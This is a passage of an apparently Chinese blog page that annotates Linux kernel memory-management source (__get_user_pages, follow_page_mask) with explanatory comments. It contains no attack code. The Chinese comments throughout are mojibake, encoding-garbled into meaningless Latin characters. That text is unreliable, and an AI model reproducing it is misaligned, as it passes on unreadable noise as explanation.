class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __get_user_pages() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:task_struct of target task</span><br><span class="hljs-comment"> * @mm:mm_struct of target mm</span><br><span class="hljs-comment"> * @start:starting user address</span><br><span class="hljs-comment"> * @nr_pages:number of pages from start to pin</span><br><span class="hljs-comment"> * @gup_flags:flags modifying pin behaviour</span><br><span class="hljs-comment"> * @pages:array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> * @nonblocking: whether waiting for disk IO or mmap_sem contention</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held.  It may be released.  See below.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * __get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * __get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @gup_flags &amp; FOLL_WRITE == 0, the page must not be written to. If</span><br><span class="hljs-comment"> * the page is written to, set_page_dirty (or set_page_dirty_lock, as</span><br><span class="hljs-comment"> * appropriate) must be called after the page is finished with, and</span><br><span class="hljs-comment"> * before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @nonblocking != NULL, __get_user_pages will not wait for disk IO</span><br><span class="hljs-comment"> * or mmap_sem contention, and if waiting is needed to pin all pages,</span><br><span class="hljs-comment"> * *@nonblocking will be set to 0.  Further, if @gup_flags does not</span><br><span class="hljs-comment"> * include FOLL_NOWAIT, the mmap_sem will be released via up_read() in</span><br><span class="hljs-comment"> * this case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A caller using such a combination of @nonblocking and @gup_flags</span><br><span class="hljs-comment"> * must therefore hold the mmap_sem for reading only, and recognize</span><br><span class="hljs-comment"> * when it&#x27;s been released.  Otherwise, it must be held for either</span><br><span class="hljs-comment"> * reading or writing and will not be released.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In most cases, get_user_pages or get_user_pages_fast should be used</span><br><span class="hljs-comment"> * instead of __get_user_pages. __get_user_pages should be used only if</span><br><span class="hljs-comment"> * you need some special @gup_flags.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__get_user_pages()-æŠŠç”¨æˆ·é¡µé¢å›ºå®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">@tskï¼šç›®æ ‡è¿›ç¨‹</span><br><span class="hljs-comment">@mmï¼šç›®æ ‡å†…å­˜ç©ºé—´</span><br><span class="hljs-comment">@startï¼šèµ·å§‹ç”¨æˆ·åœ°å€</span><br><span class="hljs-comment">@nr_pagesï¼šé”å®šå¤šå°‘é¡µé¢</span><br><span class="hljs-comment">@gup_flagsï¼šæ§åˆ¶get user pagesçš„è¡Œä¸ºæ ‡å¿—</span><br><span class="hljs-comment">@pagesï¼šæ¥å—è¢«é”å®šé¡µé¢æŒ‡é’ˆçš„æŒ‡é’ˆæ•°ç»„ï¼Œæœ€å°‘è¦èƒ½ä¿å­˜nr_pagesä¸ªæŒ‡é’ˆ</span><br><span class="hljs-comment">@vmasï¼šä¸€ä¸ªVMAæŒ‡é’ˆæ•°ç»„ï¼Œç”¨äºå­˜æ”¾æ¯ä¸€ä¸ªé¡µé¢å¯¹åº”çš„VMAå¯¹è±¡</span><br><span class="hljs-comment">@nonblockingï¼šæ˜¯å¦ç­‰å¾…ç£ç›˜IOæˆ–è€…mmap_semç«äº‰</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br>&#123;<br><span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<span class="hljs-comment">//æ ¹æ®é¡µé¢å¤§å°è®¾ç½®æ©ç </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">â€”â€”ï¼ï¼pages:ç­‰ä»·äºpages!=0ï¼Œè¡¨ç¤ºpagesæ˜¯å¦ä¸ºä¸€ä¸ªéç©ºæŒ‡é’ˆ</span><br><span class="hljs-comment">â€”â€”ï¼ï¼(gup_flags &amp; FOLL_GET):ç­‰ä»·äºgup_flags &amp; FOLL_GETï¼=0ï¼Œæ ‡å¿—æ˜¯å¦è®¾ç½®FOLL_GETæ ‡å¿—</span><br><span class="hljs-comment">â€”â€”åªè¦è¿™ä¸¤ä¸ªæ¡ä»¶ä¸åƒç­‰å°±ä¼šå‡ºbug</span><br><span class="hljs-comment">è¦ä¹ˆpagesæ˜¯ä¸ªç©ºæŒ‡é’ˆï¼Œgup_flagsæ²¡è®¾ç½®FOLL_GETæ ‡å¿—ï¼Œä¸éœ€è¦è·å–é¡µé¢</span><br><span class="hljs-comment">è¦ä¹ˆpageså­˜åœ¨ï¼Œgup_flagsè®¾ç½®äº†FOLL_GETæ ‡å¿—ï¼Œéœ€è¦è·å–é¡µé¢*/</span><br>VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment"> * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment"> * using the address space</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br>gup_flags |= FOLL_NUMA;<br>    <br><span class="hljs-comment">//é€šè¿‡ä¸€ä¸ªdo&#123;...&#125;while(nr_pages)å¾ªç¯, éå†æ‰€æœ‰éœ€è¦é”å®šçš„é¡µ, å¤„ç†ä¸€ä¸ªé¡µä¹‹å‰, å…ˆæ‰¾åˆ°æ‰€å±çš„VMA</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> foll_flags = gup_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_increm;<br><br>        <span class="hljs-comment">//å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œæˆ–è€…è·¨è¶Šäº†VMAçš„è¾¹ç•Œ</span><br><span class="hljs-comment">/* first iteration or cross vma bound */</span><br><span class="hljs-keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;<br>vma = find_extend_vma(mm, start);<span class="hljs-comment">//å¯»æ‰¾åŒ…å«startçš„VMAå¯¹è±¡</span><br><span class="hljs-keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;<span class="hljs-comment">//å¯»æ‰¾å‡ºé”™</span><br><span class="hljs-type">int</span> ret;<br>ret = get_gate_page(mm, start &amp; PAGE_MASK,<br>gup_flags, &amp;vma,<br>pages ? &amp;pages[i] : <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> i ? : ret;<br>page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> next_page;<br>&#125;<br><span class="hljs-comment">//çŸ­è·¯æµ‹è¯•ï¼šå¦‚æœvmaä¸ä¸ºNULLï¼Œé‚£å°±ä¼šæ‰§è¡Œcheck_vma_flags(vma, gup_flags)æ£€æŸ¥ä¸‹vmaçš„æƒé™æ˜¯æ»¡è¶³gup_flagsçš„è¦æ±‚</span><br><span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br><span class="hljs-keyword">return</span> i ? : -EFAULT;<br><span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<span class="hljs-comment">//å¯¹äºå¤§TLBçš„é¡µé¢ï¼Œè°ƒç”¨follow_hugetlb_page()å¤„ç†</span><br>i = follow_hugetlb_page(mm, vma, pages, vmas,<br>&amp;start, &amp;nr_pages, i,<br>gup_flags);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> * potentially allocating memory.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">/*__get_user_pages()æœ€æ ¸å¿ƒçš„éƒ¨åˆ†, å°±æ˜¯ä¸‹é¢è¿™ä¸ªå¾ªç¯, follow_page_mask()åˆ¤æ–­å¯¹åº”é¡µæ˜¯å¦æ»¡è¶³foll_flagsè¦æ±‚, faultin_page()è´Ÿè´£å¤„ç†é”™è¯¯, ä¼šä¸€ç›´å¾ªç¯åˆ°å¯¹åº”é¡µæ»¡è¶³foll_flagsçš„è¦æ±‚*/</span><br>        <span class="hljs-comment">//å¦‚æœæœ‰å¾…å¤„ç†çš„SIGKILLï¼Œå°±ç›´æ¥ç»“æŸ</span><br><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>cond_resched();<span class="hljs-comment">//è°ƒåº¦æ‰§è¡Œåˆ«çš„ä»»åŠ¡</span><br>        <span class="hljs-comment">//æ ¹æ®foll_flagsçš„è¦æ±‚è¿½è¸ªvmaä¸­startå¯¹åº”çš„é¡µï¼Œå¦‚æœä¸èƒ½æ»¡è¶³è¦æ±‚æˆ–è€…é¡µä¸å­˜åœ¨ï¼Œå°±è¿”å›NULL</span><br>page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">//ç¼ºé¡µå¼‚å¸¸å¤„ç†</span><br><span class="hljs-type">int</span> ret;<br>            <span class="hljs-comment">//faultin_page()ä¼šå¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œå¤„ç†å®Œæ¯•åä¼šè¿”å›0</span><br>ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br>nonblocking);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-keyword">goto</span> retry;<span class="hljs-comment">//ç¼ºé¡µå¼‚å¸¸å¤„ç†å®Œæ¯•ï¼Œå†æ¬¡å°è¯•è¿½è¸ªé¡µï¼Œçœ‹æœ‰æ— ç¼ºé¡µå¼‚å¸¸å‘ç”Ÿ</span><br><span class="hljs-keyword">case</span> -EFAULT:<span class="hljs-comment">//å¤„ç†ç¼ºé¡µå¼‚å¸¸æ—¶å‘é€ï¼Œå¤„ç†ç»ˆæ­¢</span><br><span class="hljs-keyword">case</span> -ENOMEM:<br><span class="hljs-keyword">case</span> -EHWPOISON:<br><span class="hljs-keyword">return</span> i ? i : ret;<br><span class="hljs-keyword">case</span> -EBUSY:<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">case</span> -ENOENT:<span class="hljs-comment">//å¼‚å¸¸å¤„ç†å®Œæ¯•ï¼Œåªæ˜¯æ²¡æœ‰å¯¹åº”çš„é¡µæè¿°ç¬¦ï¼Œå¤„ç†ä¸‹ä¸€é¡µ</span><br><span class="hljs-keyword">goto</span> next_page;<br>&#125;<br>BUG();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment"> * struct page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">goto</span> next_page;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br><span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>&#125;<br>        <span class="hljs-comment">//å¤„ç†å®Œè¿™ä¸ªé¡µä¹‹å, è®°å½•ç»“æœ, ç„¶åå¤„ç†ä¸‹ä¸€ä¸ªé¡µ</span><br><span class="hljs-keyword">if</span> (pages) &#123;<span class="hljs-comment">//è®°å½•é”å®šçš„é¡µ</span><br>pages[i] = page;<br>flush_anon_page(vma, page, start);<br>flush_dcache_page(page);<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>next_page:<br><span class="hljs-keyword">if</span> (vmas) &#123;<span class="hljs-comment">//è®°å½•é¡µå¯¹åº”çš„vma</span><br>vmas[i] = vma;<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br><span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>page_increm = nr_pages;<br>i += page_increm;<span class="hljs-comment">//å¤„ç†äº†å¤šå°‘é¡µ</span><br>start += page_increm * PAGE_SIZE;<span class="hljs-comment">//ä¸‹ä¸€ä¸ªå¤„ç†çš„åœ°å€</span><br>nr_pages -= page_increm;<span class="hljs-comment">//è¿˜å‰©å¤šå°‘é¡µ</span><br>&#125; <span class="hljs-keyword">while</span> (nr_pages);<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>EXPORT_SYMBOL(__get_user_pages);<br></code></pre></td></tr></table></figure><h4 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask()"></a>follow_page_mask()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment"> * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment"> * @address: virtual address to look up</span><br><span class="hljs-comment"> * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment"> * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns the mapped (struct page *), %NULL if no mapping exists, or</span><br><span class="hljs-comment"> * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment"> * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  follow_page_mask -æ ¹æ®ä¸€ä¸ªç”¨æˆ·ç©ºé—´åœ°å€æ‰¾ä¸€ä¸ªé¡µæè¿°ç¬¦</span><br><span class="hljs-comment">  @vmaï¼šæ˜ å°„@addressçš„VMAå¯¹è±¡</span><br><span class="hljs-comment">  @flagsï¼šæ§åˆ¶æŸ¥æ‰¾è¡Œä¸ºçš„æè¿°ç¬¦</span><br><span class="hljs-comment">  @page_maskï¼š*page_maskæ ¹æ®é¡µé¢å¤§å°è®¾ç½®</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  è¿”å›è¢«æ˜ å°„çš„é¡µï¼Œå¦‚æœé¡µä¸å­˜åœ¨æˆ–è€…å‡ºé”™çš„è¯å°±è¿”å›NULL</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123;<br><span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//å…¨å±€é¡µç›®å½•</span><br><span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//é¡µä¸Šçº§ç›®å½•</span><br><span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">//é¡µä¸­çº§ç›®å½•</span><br><span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">//è‡ªæ—‹é”</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<span class="hljs-comment">//VMAæ‰€å±çš„å†…å­˜ç©ºé—´</span><br><br>*page_mask = <span class="hljs-number">0</span>;<span class="hljs-comment">//æ ¹æ®é¡µé¢å¤§å°è®¾ç½®çš„æ©ç </span><br><br>page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE);<br><span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>BUG_ON(flags &amp; FOLL_GET);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    è·Ÿè¸ªå››çº§é¡µç›®å½•:pgd=&gt;pud=&gt;pmd,</span><br><span class="hljs-comment">    å¦‚æœå¯¹åº”è¡¨é¡¹ä¸ºnone, åˆ™è¿”å›no_page_table()è¡¨ç¤ºå‡ºé”™, æœ€åè¿›å…¥follow_page_pte()è·Ÿè¸ªpte</span><br><span class="hljs-comment">    */</span><br><span class="hljs-comment">//åœ¨mmä¸­æ ¹æ®addressæ‰¾å¯¹åº”çš„é¡µå…¨å±€ç›®å½•</span><br>pgd = pgd_offset(mm, address);<br><span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>    <br><span class="hljs-comment">//åœ¨é¡µå…¨å±€ç›®å½•ä¸­æ‰¾å¯¹åº”çš„é¡µä¸Šçº§ç›®å½•</span><br>pud = pud_offset(pgd, address);<br><span class="hljs-keyword">if</span> (pud_none(*pud))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>page = follow_huge_pud(mm, address, pud, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-comment">//åœ¨é¡µä¸Šçº§ç›®å½•ä¸­æ‰¾å¯¹åº”çš„é¡µä¸­çº§ç›®å½•</span><br>pmd = pmd_offset(pud, address);<br><span class="hljs-keyword">if</span> (pmd_none(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>page = follow_huge_pmd(mm, address, pmd, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_devmap(*pmd)) &#123;<br>ptl = pmd_lock(mm, pmd);<br>page = follow_devmap_pmd(vma, address, pmd, flags);<br>spin_unlock(ptl);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><span class="hljs-keyword">if</span> (likely(!pmd_trans_huge(*pmd)))<span class="hljs-comment">//è·Ÿè¸ªpte</span><br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><br>ptl = pmd_lock(mm, pmd);<br><span class="hljs-keyword">if</span> (unlikely(!pmd_trans_huge(*pmd))) &#123;<br>spin_unlock(ptl);<br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>&#125;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br><span class="hljs-type">int</span> ret;<br>page = pmd_page(*pmd);<br><span class="hljs-keyword">if</span> (is_huge_zero_page(page)) &#123;<br>spin_unlock(ptl);<br>ret = <span class="hljs-number">0</span>;<br>split_huge_pmd(vma, pmd, address);<br><span class="hljs-keyword">if</span> (pmd_trans_unstable(pmd))<br>ret = -EBUSY;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>get_page(page);<br>spin_unlock(ptl);<br>lock_page(page);<br>ret = split_huge_page(page);<br>unlock_page(page);<br>put_page(page);<br><span class="hljs-keyword">if</span> (pmd_none(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><br><span class="hljs-keyword">return</span> ret ? ERR_PTR(ret) :<br>follow_page_pte(vma, address, pmd, flags);<br>&#125;<br><br>page = follow_trans_huge_pmd(vma, address, pmd, flags);<br>spin_unlock(ptl);<br>*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte()"></a>follow_page_pte()</h4><p>å¯¹äºå¤§å¤šæ•°æ™®é€šé¡µæ¥è¯´<code>follow_page_pte()</code>ä¼šæ£€æŸ¥é¡µä¸å­˜åœ¨å’Œé¡µä¸å¯å†™å…¥ä¸¤ç§ç¼ºé¡µå¼‚å¸¸, ç„¶åè°ƒç”¨<code>vm_normal_page()</code>æ ¹æ®<code>pte</code>æ‰¾åˆ°å¯¹åº”çš„é¡µæè¿°ç¬¦<code>page</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 